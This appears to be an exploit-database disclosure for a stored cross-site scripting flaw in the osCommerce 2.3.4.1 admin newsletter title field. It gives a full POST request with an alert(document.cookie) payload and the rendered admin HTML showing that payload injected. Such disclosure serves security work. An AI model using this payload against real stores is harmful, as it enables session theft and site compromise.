@@ -1,0 +1,112 @@
+# Exploit Title: osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting
+# Date: 2020-11-19
+# Exploit Author: Emre Aslan
+# Vendor Homepage: https://www.oscommerce.com/
+# Version: 2.3.4.1
+# Tested on: Windows & XAMPP
+
+==> Tutorial <==
+
+1- Login to admin panel.
+2- Go to the following url. ==> http(s)://(HOST)/catalog/admin/newsletters.php?action=new
+3- Enter the XSS payload into the title section and save it.
+
+==> Vulnerable Parameter <==
+
+title= (post parameter)
+
+==> HTTP Request <==
+
+POST /catalog/admin/newsletters.php?action=insert HTTP/1.1
+Host: (HOST)
+Connection: keep-alive
+Content-Length: 123
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://(HOST)/
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://(HOST)/catalog/admin/newsletters.php?action=new
+Accept-Encoding: gzip, deflate, br
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: osCAdminID=s11ou44m0vrasducn78c6sg
+
+module=newsletter&title="><img src=1 href=1 onerror="javascript:alert(document.cookie)"></img>&content=xss
+
+==> Vulnerable Source Code <==
+
+<div id="contentText">
+    <table border="0" width="100%" cellspacing="0" cellpadding="2">
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td class="pageHeading">Newsletter Manager</td>
+            <td class="pageHeading" align="right"><img src="images/pixel_trans.gif" border="0" alt="" width="57" height="40" /></td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td><table border="0" width="100%" cellspacing="0" cellpadding="0">
+          <tr>
+            <td valign="top"><table border="0" width="100%" cellspacing="0" cellpadding="2">
+              <tr class="dataTableHeadingRow">
+                <td class="dataTableHeadingContent">Newsletters</td>
+                <td class="dataTableHeadingContent" align="right">Size</td>
+                <td class="dataTableHeadingContent" align="right">Module</td>
+                <td class="dataTableHeadingContent" align="center">Sent</td>
+                <td class="dataTableHeadingContent" align="center">Status</td>
+                <td class="dataTableHeadingContent" align="right">Action&nbsp;</td>
+              </tr>
+                  <tr id="defaultSelected" class="dataTableRowSelected" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?page=1&nID=2&action=preview'">
+                <td class="dataTableContent"><a href="http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?page=1&nID=2&action=preview"><img src="images/icons/preview.gif" border="0" alt="Preview" title="Preview" /></a>&nbsp;"><img src=1 href=1 onerror="javascript:alert(document.cookie)"></img></td>
+                <td class="dataTableContent" align="right">3 bytes</td>
+                <td class="dataTableContent" align="right">newsletter</td>
+                <td class="dataTableContent" align="center"><img src="images/icons/cross.gif" border="0" alt="False" title="False" /></td>
+                <td class="dataTableContent" align="center"><img src="images/icons/unlocked.gif" border="0" alt="Unlocked" title="Unlocked" /></td>
+                <td class="dataTableContent" align="right"><img src="images/icon_arrow_right.gif" border="0" alt="" />&nbsp;</td>
+              </tr>
+                  <tr class="dataTableRow" onmouseover="rowOverEffect(this)" onmouseout="rowOutEffect(this)" onclick="document.location.href='http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?page=1&nID=1'">
+                <td class="dataTableContent"><a href="http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?page=1&nID=1&action=preview"><img src="images/icons/preview.gif" border="0" alt="Preview" title="Preview" /></a>&nbsp;"><img src=1 href=1 onerror="javascript:alert(1)"></img></td>
+                <td class="dataTableContent" align="right">7 bytes</td>
+                <td class="dataTableContent" align="right">newsletter</td>
+                <td class="dataTableContent" align="center"><img src="images/icons/cross.gif" border="0" alt="False" title="False" /></td>
+                <td class="dataTableContent" align="center"><img src="images/icons/unlocked.gif" border="0" alt="Unlocked" title="Unlocked" /></td>
+                <td class="dataTableContent" align="right"><a href="http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?page=1&nID=1"><img src="images/icon_info.gif" border="0" alt="Info" title="Info" /></a>&nbsp;</td>
+              </tr>
+              <tr>
+                <td colspan="6"><table border="0" width="100%" cellspacing="0" cellpadding="2">
+                  <tr>
+                    <td class="smallText" valign="top">Displaying <strong>1</strong> to <strong>2</strong> (of <strong>2</strong> newsletters)</td>
+                    <td class="smallText" align="right">Page 1 of 1</td>
+                  </tr>
+                  <tr>
+                    <td class="smallText" align="right" colspan="2"><span class="tdbLink"><a id="tdb1" href="http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?action=new">New Newsletter</a></span><script type="text/javascript">$("#tdb1").button({icons:{primary:"ui-icon-plus"}}).addClass("ui-priority-secondary").parent().removeClass("tdbLink");</script></td>
+                  </tr>
+                </table></td>
+              </tr>
+            </table></td>
+            <td width="25%" valign="top">
+<table border="0" width="100%" cellspacing="0" cellpadding="2">
+  <tr class="infoBoxHeading">
+    <td class="infoBoxHeading"><strong>"><img src=1 href=1 onerror="javascript:alert(document.cookie)"></img></strong></td>
+  </tr>
+</table>
+<table border="0" width="100%" cellspacing="0" cellpadding="2">
+  <tr>
+    <td align="center" class="infoBoxContent"><span class="tdbLink"><a id="tdb2" href="http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?page=1&nID=2&action=preview">Preview</a></span><script type="text/javascript">$("#tdb2").button({icons:{primary:"ui-icon-document"}}).addClass("ui-priority-secondary").parent().removeClass("tdbLink");</script><span class="tdbLink"><a id="tdb3" href="http://127.0.0.1:8080/oscommerce-2.3.4.1/catalog/admin/newsletters.php?page=1&nID=2&action=lock">Lock</a></span><script type="text/javascript">$("#tdb3").button({icons:{primary:"ui-icon-locked"}}).addClass("ui-priority-secondary").parent().removeClass("tdbLink");</script></td>
+  </tr>
+  <tr>
+    <td class="infoBoxContent"><br />Date Added: 11/19/2020</td>
+  </tr>
+</table>
+            </td>
+          </tr>
+        </table></td>
+      </tr>
+    </table>
+</div>
